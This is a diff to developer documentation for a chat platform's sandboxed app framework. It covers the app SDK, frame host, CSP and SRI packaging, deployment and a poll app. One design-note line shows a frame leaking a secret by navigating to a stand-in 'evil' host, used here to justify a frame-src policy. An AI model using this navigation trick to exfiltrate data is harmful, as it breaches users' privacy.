@@ -95,7 +95,7 @@ The frame is an opaque origin, so there is no origin to compare. The host checks
 - `state.patch { patch, baseRev? }`: a JSON Merge Patch (RFC 7396) over the state. `baseRev` makes it conditional.
 - `events.send { name, data }`: an ephemeral event for the others. `name` matches `/^[a-z][a-z0-9.-]{0,31}$/`.
 - `assets.get { name }`: the bytes of one of the manifest's `assets[]`, checked by the host.
-- `files.pickLocal`: the host opens the picker (the manifest decides accept list and size cap) and transfers the bytes. The file name never crosses.
+- `files.pickLocal`: the host opens the picker (the manifest decides accept list and size cap) and transfers the bytes. The file name never crosses: the answer is `{ bytes, ext }`, where `ext` is the lower-cased extension with its dot, taken from the manifest's accept list.
 - `ui.resize { height }`: 120 to 2000 pixels.
 - `ui.fullscreen { on }`
 - `share.request { on }`: share the app pane through pqp's own flow (apps whose manifest allows it).
@@ -134,6 +134,45 @@ JSON values must survive `JSON.stringify` unchanged: no `undefined`, functions, 
 ### What the app never sees
 
 A pqp user id, an email, a token, a server id or a channel id. It gets a display name, an avatar as a data URL, a random per-session seat id (16 to 32 characters of `A-Za-z0-9_-`), and, for people who ticked the consent box only, a per-app derived id. `bridge.test.ts` walks every bridge schema and fails if a key named `userId`, `user_id`, `email`, `token`, `serverId` or `channelId` appears on it. The WebSocket frames may carry user ids, because the page needs them to draw avatars; the page strips them before anything reaches the app.
+
+## Writing an app
+
+An app is a small web bundle that runs in a sandboxed frame (no network, no storage, an opaque origin) and talks to the pqp page through `@pqp/app-sdk`. The SDK has no runtime dependencies and does the handshake for you.
+
+```ts
+import { applyTheme, connect, PqpAppError } from "@pqp/app-sdk";
+
+const app = await connect(); // app-hello / app-port, then the host's hello
+applyTheme(app.hello.theme);
+app.on("theme", applyTheme);
+
+const label = document.querySelector("#count")!;
+const render = ({ value }: { value: unknown }) => {
+  label.textContent = String((value as { count?: number } | null)?.count ?? 0);
+};
+app.state.on(render); // register right after connect...
+render(await app.state.get()); // ...and read the current value with get()
+
+document.querySelector("#plus")!.addEventListener("click", async () => {
+  const { rev, value } = await app.state.get();
+  try {
+    await app.state.patch({ count: ((value as { count?: number } | null)?.count ?? 0) + 1 }, { baseRev: rev });
+  } catch (error) {
+    if (!(error instanceof PqpAppError) || error.code !== "stale-rev") throw error; // somebody was faster: ignore
+  }
+});
+app.events.on("ping", ({ data }) => console.log("ping from", data));
+await app.events.send("ping", { hello: true });
+```
+
+What to know:
+
+- `connect()` resolves with the app once the host's `hello` arrived (`app.hello`: platform version, app id and version, locale, theme, `self`). It rejects with `unavailable` when pqp does not answer in 15 seconds, and at once when the page is not inside a pqp frame. Call it once; a second call returns the same promise.
+- Listeners (`participants.on`, `state.on`, `events.on(name, cb)`, `app.on("connection" | "theme" | "ended", cb)`) return an unsubscribe function. Register them right after `connect()` and use the `get` calls for the value from before. A push that arrives before a listener exists is not replayed.
+- Every call returns a promise and rejects with a `PqpAppError` whose `code` is one of the bridge's codes (`not-allowed`, `not-host`, `too-large`, `rate-limited`, `stale-rev`, `cancelled`, `unavailable`, `ended`, `invalid`). A call the host does not answer within 15 seconds rejects with `unavailable`. After `ended` every call rejects with `ended`. A success the host sends must echo the request's `type` and carry the fields of its call (`events.send` and `end` answer `result: null`); a reply that names another call, omits the type or has a field of the wrong kind rejects with `unavailable`, so a write never looks done on the strength of someone else's answer.
+- `events.send` and `end` resolve to `null`. `files.pickLocal()` resolves to `{ bytes, ext }`, or `null` when the person cancels. `assets.get(name)` resolves to an `ArrayBuffer` the host already checked against the manifest's hash.
+- The app sees seat ids, display names and avatar data URLs, never pqp user ids. State is a JSON Merge Patch over one JSON value of at most 16 KB, events are at most 1 KB, and the manifest can lower both caps.
+- Theme: the host sends up to 64 CSS custom properties. `applyTheme(theme)` writes them on the document element through the CSSOM, which the frame's `style-src 'self'` allows.
 
 ## Availability
 
@@ -219,8 +258,88 @@ Retention: `sweepAppSessionRetention` (daily, `services/retention.ts`) deletes e
 
 `GET /api/admin/metrics` has an `apps` block, live: `live` (sessions, seats and sessions by app, from the table, or `null` when the database could not be asked) and `counters` since this process started: `starts`, `startsRefused` by reason, `ends` by reason, `handoffs` (`sweep`, `take`), `joins`, `joinsRefused` by code, `framesDropped` by the cap that refused them, `stateWrites`, `stateWritesCoalesced`, `events`, `hostGoneStamped`, `participantsRemoved`, `deadInstanceSeats`, `sweepRuns`, `sweepFailures`. With two instances and a worker, read each and sum.
 
+## In the client
+
+Nothing here draws or requests anything while `GET /api/apps/config?serverId=` answers `enabled: false`, or has not answered yet (`hooks/use-apps-config.ts`, re-asked by `lib/config-refresh.ts` like the other feature configs).
+
+- **The live store** (`client/src/lib/apps/app-sessions-store.ts`) is the one source of truth for "an app is running in this channel": the card, the strip and the presence line all read it. It is fed by `GET /api/servers/:id/app-sessions` on server open and after every reconnect (`hooks/use-apps-sessions-sync.ts`, jittered like the other reconnect reads) and by the `channel-app` and `app-ended` frames. `handleAppsFrame` is the one door for every apps frame (`channel-app`, `app-ended`, `app-session`, `app-error`, and `app-state` / `app-event`, which it swallows because nothing draws them yet); `App.tsx` calls it before any other stop for those types, since `app-session` and `app-error` are what end a join. A frame that lands while a read is in flight wins over that read, so a slow answer cannot bring back a session that ended meanwhile.
+- **The timeline card** (`components/apps/app-session-card.tsx`, wired by `app-session-timeline-row.tsx` from `message-list.tsx`) draws a message of kind `app_session`. The message carries its session (`message.appSession`: id, app, status, how it ended, the quiet record's summary), so the card finds its live session in the store by that id and needs no guessing. `lib/apps/card-model.ts` decides which of the states (open, inside, full, reconnecting, host left, ended, switched off, unknown) a card is in from data alone.
+- **An ended session** reads what this tab heard first (`app-ended` now reaches every viewer of the channel, with the reason and the summary), then what the message itself carries. A message that still says `live` while the store has nothing running is a session that ended while this tab was not looking: "Terminou." with the app's name and no count. `appSession: null` is a session the server has retained away: the generic "Terminou." with who started it. The summary's `result` (an app's small JSON object, at most 512 bytes) travels with the card model. The convention for every app: one that wants a closing line on the card writes `state.result = { text: "..." }` before ending; the card draws that string as plain text, on one line, at most 200 characters, under the summary, and ignores any other shape.
+- **Joining** goes through `requestAppJoin(sessionId, options)`: whoever registered with `registerAppJoinInterceptor` (the join sheet) first, otherwise `joinAppSession`, which sends `app-join` through the transport the shell registered and waits for the summary to seat the viewer, an `app-error`, or eight seconds.
+
+## The frame host (web client)
+
+The pqp page runs an app in a sandboxed frame and is the only thing that talks to it. Code: `client/src/lib/apps/` (logic) and `client/src/components/apps/app-frame.tsx` (the React wrapper).
+
+- **`AppFrame`** renders a wrapper `div` (`data-status` is `loading`, `ready`, `error` or `ended`) and `mountAppFrame` (`lib/apps/frame-controller.ts`) puts one `<iframe sandbox="allow-scripts" allow="" referrerpolicy="no-referrer">` in it. Props: `app` (an entry of `GET /api/apps/config`, as `AppRuntimeConfig`), `appsOrigin`, `transport`, `users`, `title`, `locale`, `asSpectator`, `onStatus`, `onShare`. `onStatus` gets `{ kind: "loading" | "ready" }`, `{ kind: "error", reason, code? }` (`bad-entry`, `join-failed` with the transport's code, `timeout`, `frame-navigated`, `flood`) or `{ kind: "ended", reason }`. The seat is taken on mount and released on unmount.
+- **`AppSessionTransport`** (`lib/apps/types.ts`) is the whole interface to the server: `join`, `leave`, `patchState`, `sendEvent`, `end`, `subscribe` (handlers `onSession`, `onState`, `onEvent`, `onConnection`, `onEnded`). It maps one to one onto the `/ws` frames of `packages/shared/src/apps/frames.ts` and `POST /api/app-sessions/:id/end`. Participant changes reach the host as a fresh `app-session` snapshot (`onSession`): it is the only frame that carries seat ids next to user ids, so a roster change must be delivered to participants that way.
+- **The bridge host** (`lib/apps/bridge-host.ts`) parses every message with `bridgeAppMessageSchema` (strict: a failure is answered `invalid`, or dropped when it has no usable id), enforces the manifest again (event rate and bytes, state bytes counted on the MERGED state, who may write, `share` only for a `pane` app where sharing is allowed, `files.pickLocal` only when files are allowed), maps `AppTransportError` codes to bridge errors, builds participants from scratch (a seat id, a cleaned display name, an avatar data URL of at most 65536 characters or null, never a user id; one list holds at most 4 MiB of avatars, so past that the largest are left out and the app draws its fallback) and passes every answer and push through the bridge schemas (a successful answer echoes the request `type`). A flood is answered `rate-limited` without parsing and ends the frame if it keeps going.
+- **Files and assets.** `files.pickLocal` creates an `<input type=file>` in the PAGE (`accept` and the size cap from the manifest), reads the file and answers `{ bytes, ext }`; the file name is read once to find the extension and goes nowhere. `assets.get` fetches the manifest's asset with `cache: "force-cache"`, only from the apps origin (an asset URL anywhere else is refused without a request, and a redirect is an error), reading the body with the declared size as a hard limit, then checks the sha256 with `crypto.subtle` and transfers a copy; a mismatch answers `unavailable` and logs once, and concurrent requests for one asset share one fetch. Avatars are fetched only from `avatarOrigins` (the page's own origin and the API's; a user can set their avatar URL to anything), with a byte limit, a few at a time, and not at all once a roster's 4 MiB is spent.
+- **Theme.** `hello` and `theme` carry up to 64 CSS custom properties: an allowlist of the design tokens of `docs/DESIGN.md` (surfaces, borders, text, accent, status and soft pairs, radii, fonts, `--color-focus-ring`) read as the browser resolved them, plus `--pqp-color-scheme` (`light` or `dark`). A change of brightness, skin, contrast or accent hue pushes `theme` again. `reducedMotion` is the OS setting.
+- **Keyboard.** The frame is one tab stop and the page never traps focus or captures Escape; an app that traps focus fails review. `AppFrameHandle.focus()` puts focus on the frame from outside.
+
+**Why the page carries a CSP at all.** CSP inside the frame cannot stop a frame from navigating ITSELF (`location.href = "https://evil/?" + secret`, `<meta http-equiv=refresh>`, an anchor click): it is a navigation, and `navigate-to` does not exist. The only control is the embedding page's `frame-src` (S0 spike). pqp.gg has no CSP and a site-wide header is a bigger decision, so when the first app frame mounts the page inserts `<meta http-equiv="Content-Security-Policy" content="frame-src 'self' blob: <apps origin> <every origin the client frames>">`: `lib/apps/frame-policy.ts`. It carries `frame-src` only, so it constrains nothing else, and it stays for the life of the page. The origins are YouTube (`www.youtube.com`, `www.youtube-nocookie.com`), Twitch (`player.twitch.tv`, `clips.twitch.tv`), TikTok, Instagram, and Cloudflare Turnstile. Not Google sign-in (One Tap) and not Clerk's host: their flows carry a `state` or redirect parameter to a destination somebody else registered, which would let a navigating app frame hand data to it; a deployment that frames more passes it as an extra origin. Never a wildcard on a multi-tenant domain. `frame-policy.test.ts` checks every embed URL the shared builders produce against the list and fails when a new source file renders an iframe. The host also removes the frame on a second `load` event (it left the document it was given) and after 20 seconds without a `hello`. Both are in `client/e2e/app-frame/`, which runs the real controller, host and SDK in a sandboxed frame under the production CSP against a canary server, in Chromium, WebKit and Firefox: without the policy all three engines deliver `?secret=1` to the canary, with it none does, for `location.href`, `location.replace`, `location.assign`, `<meta refresh>` and an anchor click.
+
+Residual: the policy is page-wide, so a listed origin is also a place a hostile frame can send a query string to (with whatever the app was told). The listed embed hosts have no redirect to a destination the sender picks, so that data lands in a vendor's logs, not with the app's author. A structural fix (the app frame in a wrapper document whose `frame-src` is the apps origin alone) is a follow-up decision. WebKit opens a TCP connection for `<link rel=preconnect>` despite the CSP (S0 finding d).
+
+Run the browser suite with `pnpm --filter @pqp/client e2e:app-frame` (CI runs Chromium and Firefox; add `--project=webkit` locally).
+
+## Packaging
+
+First-party apps live in the repository, one folder each under `apps/<name>/` (a pnpm workspace folder). `tools/apps-build/` builds them and writes everything the platform needs to serve and trust a bundle.
+
+An app folder holds `manifest.source.json` (the manifest an author writes, validated with `appManifestSourceSchema`, so no hashes), a Vite app (`index.html`, `src/`) and its own `package.json` depending on `@pqp/app-sdk`. The entry page is `index.html`. Eco (`apps/eco/`, id `pqp-eco`) is the internal test app: a participant list with avatars, a counter in the session state, a ping event. It is `draft` until an operator turns it on; with `DEV_AUTH_BYPASS` the dev seed turns it on for the Sandbox hall only.
+
+| Command | What it does |
+|---|---|
+| `pnpm apps:build` | Builds every app into `dist-apps/<id>/<version>/`, writes `dist-apps/_headers` and `server/src/apps/catalog.json`. |
+| `pnpm apps:check` | Builds into a scratch folder and fails when the committed `catalog.json` differs (the lockfile pattern), or when a released version would change its bytes. Runs in CI. |
+| `pnpm apps:dev` | Builds, serves `dist-apps` on `http://localhost:5175` with the same `_headers` rules (cache disabled) and rebuilds when `apps/` or `packages/app-sdk/src/` change. `APPS_DEV_PORT` moves it. |
+
+What a build does, per app:
+
+1. Vite build with a deterministic output: fixed file names (`index.js`, `index.css`, no content hash in a name, because the version folder is already immutable), no source maps, no module preload shim, nothing inlined. Same sources and same toolchain give the same bytes; a test builds twice and compares every hash. The Vite version is pinned exactly.
+2. The entry page gets Subresource Integrity (`sha384`) and `crossorigin` on every script and stylesheet. The build fails on anything the frame's CSP would silently refuse: an inline `<script>` or `<style>`, a `style=` attribute, an `on*=` handler, `<base>`, `<meta http-equiv>`, a nested frame, or any reference that is not a relative path inside the bundle.
+3. Every file is hashed. The built manifest is the source plus `entry.sha256`, and for each `assets[]` entry `sha256` and `bytes`, read from the built file (same for `store.screenshots[]`). It is validated with `validateAppManifest` before anything is written.
+4. `dist-apps/_headers`, one rule per `/<id>/<version>/*`: the frame's Content-Security-Policy, `Cache-Control: public, max-age=31536000, immutable`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Cross-Origin-Resource-Policy: cross-origin` and `Access-Control-Allow-Origin: *`. CORS is on the whole bundle, not only on `assets[]`: the frame is an opaque origin, so it fetches its own module script and its SRI-protected stylesheet in CORS mode, and without the header Chromium refuses both ("origin 'null' has been blocked by CORS policy"). The files are the public, open-source bundle, so nothing is exposed.
+5. The CSP is the one in PLAN D5 as amended by the S0 spike: `default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data: blob:; font-src 'self'; media-src blob:; connect-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors <pqp origins>`. Only the manifest's `sandbox` knobs widen it: `wasm` adds `'wasm-unsafe-eval'` to `script-src`, `localBlobs` makes `connect-src` `blob:`, `blobWorkers` adds `worker-src blob:`. `'unsafe-eval'`, `script-src blob:` and `data:` in `connect-src` are never emitted.
+
+`server/src/apps/catalog.json` is `{ "apps": [ { "manifest": <built manifest>, "manifestSha256": "<hex>" } ] }`, sorted by id then version. `manifestSha256` is the sha256 of the built manifest's canonical JSON (every object's keys sorted, no whitespace), so it does not depend on key order. The server loads it at boot, insert-only.
+
+**Versions are immutable.** The build compares with the catalog on `origin/main`: an `(id, version)` that is already there must come out with the same `manifestSha256`, or the build fails with "bump the version". The manifest hash covers `entry.sha256`, which covers the SRI of the script and stylesheet, so any change to an app's code, or to `@pqp/app-sdk` (it is bundled into every app), is a changed version. A fork or a clone without `origin/main` skips this check with a warning; CI requires it. After a release, change an app by bumping `version` in its `manifest.source.json`.
+
+**Deploy.** `.github/workflows/deploy-apps.yml` runs on a push to `main` that touches `apps/`, `packages/app-sdk/` or `tools/apps-build/`, builds and publishes `dist-apps` with `wrangler pages deploy` to the Pages project named by the repository variable `APPS_PAGES_PROJECT` (hosted: `pqp-apps`, served at `https://pqp-apps.pages.dev`). With the variable empty the job skips cleanly. The API finds the bundles through `APPS_ORIGIN` (dev `http://localhost:5175`, unset means apps cannot run). A Pages deploy replaces the whole site, so a version that is no longer built from `apps/` stops being served; a session pinned to it (at most 12 hours old) cannot load the frame for a late joiner. Keep a released version buildable until its last session is over, or accept that.
+
+## Enquete, the live poll
+
+`apps/enquete/` (id `pqp-enquete`, "Enquete" in pt-BR, "Poll" in en, "Encuesta" in es) is a show of hands that lives as long as its session, distinct from the durable poll message (`packages/shared/src/polls.ts`, whose limits it shares: a question of at most 300 characters, 2 to 10 options of at most 55). Text or voice channels, 1 to 64 players plus 64 spectators, `content.userText: true` (so it stays off listed communities), `state.writers: participants`, identity `display`, no share, no files, no network.
+
+The host writes a question and the options and picks one choice or several; everybody votes; the bars move live; the host closes the vote (a confirm first) and then ends the poll. The state, all of it written through merge patches:
+
+| Key | Who writes it | What |
+|---|---|---|
+| `poll` | the host, once | `{ question, options, multi }` |
+| `votes` | every seat, its own key only | `{ [seatId]: bitmask }`, bit `i` set when option `i` is chosen; `null` takes the vote back |
+| `closed` | the host, on close | `{ counts, voters }`, the frozen tally the screen shows from then on |
+| `result` | the host, with `closed` | `{ text, question, winners, votes, voters }`, at most 512 bytes; `text` is the closing line (at most 200 characters) in the host's language |
+
+Votes are per SEAT, not per user: the app never knows who anybody is, and someone who leaves and comes back is a new seat. A vote is a patch of that seat's key alone, so two people voting at once never overwrite each other and no `baseRev` is needed; the host's close is written against the revision its counts were read from, so the frozen counts are exactly the votes the state held. Votes that land after the close are ignored by the screen. The largest state (a 300 character question and ten 55 character options in a four-byte script, 128 seats with every option ticked) is under 12 KB, which is the manifest's `state.maxBytes`.
+
+The frame is sandboxed without `allow-forms`, and in that case a `<form>` never fires its `submit` event (Chromium blocks the submission before the page sees it), so the host's setup is plain inputs and a button, not a form. A test keeps `index.html` free of `<form>`.
+
+### The result of a session
+
+The quiet "terminou" card needs something to say once the state is gone, and `app_sessions.summary` is `{ participants, durationSeconds }`. The convention (decided by the program's orchestrator): an app that has something to show writes `state.result`, an object of at most 512 bytes of compact JSON, before the session ends, with `text`, a plain string of at most 200 characters, which is the only field the card renders. The end path copies `state.result` into `summary.result` before it clears the state (server work of the session engine, #1401, not part of the app PRs). Enquete writes it at the moment the vote closes, so whichever way the session ends afterwards (the host, a moderator, the idle sweep) it is already there: `text` is "Ganhou: Pizza, 5 votos" (en "Winner: Pizza, 5 votes", es "Ganó: Pizza, 5 votos"), "Empate: Pizza, Sushi, 3 votos cada" for a tie (three names, then an ellipsis), "Ninguém votou" when nobody did. The other fields (`question`, `winners`, `votes`, `voters`) are the poll's own record and are shrunk until the whole object fits.
+
+## The result of a session
+
+The quiet "terminou" card needs something to say once the state is gone, and `app_sessions.summary` is `{ participants, durationSeconds }`. An app that has something to show writes it in its state under the key `result`, an object of at most 512 bytes of compact JSON, before the session ends. Enquete writes it at the moment the vote closes (the question, the winning option names and their votes, how many people voted), so whichever way the session ends afterwards (the host, a moderator, the idle sweep) the result is already there. The end path copies a valid `state.result` into `summary.result` before it clears the state; an absent, oversize or non-object `result` is dropped and the card shows what it always showed. That copy is server work of the session engine and is not in this PR; until it lands the poll's own screen is where the result is read.
+
 ## Where things live
 
+- The frame host: `client/src/lib/apps/` (`bridge-host.ts`, `frame-controller.ts`, `frame-policy.ts`, `types.ts` for the transport interface), `client/src/components/apps/app-frame.tsx`; browser suite `client/e2e/app-frame/`.
+- The packager: `tools/apps-build/` (`bundle.mts` builds one app, `html.mts` SRI and the entry page rules, `headers.mts` CSP and `_headers`, `catalog.mts` the catalog and immutability, `dev-server.mts`, `cli.mts`). Apps: `apps/<name>/`. Output: `dist-apps/` (git-ignored); the committed result is `server/src/apps/catalog.json`.
+- The SDK: `packages/app-sdk/` (`@pqp/app-sdk`). `connect()` in `connect.ts`, the request and push plumbing in `client.ts`, the public object in `app.ts`. Tests use a fake host on a real `MessageChannel` (`fake-host.fixture.ts`).
 - Zod schemas, validator and constants: `packages/shared/src/apps/manifest.ts`
 - Presence formatter: `packages/shared/src/apps/presence.ts`
 - Bridge contract: `packages/shared/src/apps/bridge.ts`; WebSocket frames: `packages/shared/src/apps/frames.ts`; shared JSON, seat id and end reason pieces: `common.ts`; roster and JSON caps beyond the manifest's: `limits.ts`
